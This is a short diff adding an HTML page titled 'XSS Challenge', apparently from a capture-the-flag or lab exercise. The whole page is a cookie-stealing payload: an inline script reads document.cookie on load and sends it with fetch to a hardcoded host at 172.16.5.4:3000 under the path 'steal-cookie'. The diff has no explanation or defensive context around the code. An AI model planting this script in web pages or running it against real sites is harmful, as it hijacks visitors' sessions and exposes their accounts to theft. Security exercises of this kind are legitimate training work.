@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Challenge</title>
+</head>
+<body>
+    <script>
+        const cookie = document.cookie;
+        fetch('http://172.16.5.4:3000/steal-cookie?cookie=' + encodeURIComponent(cookie));
+    </script>
+</body>
+</html>
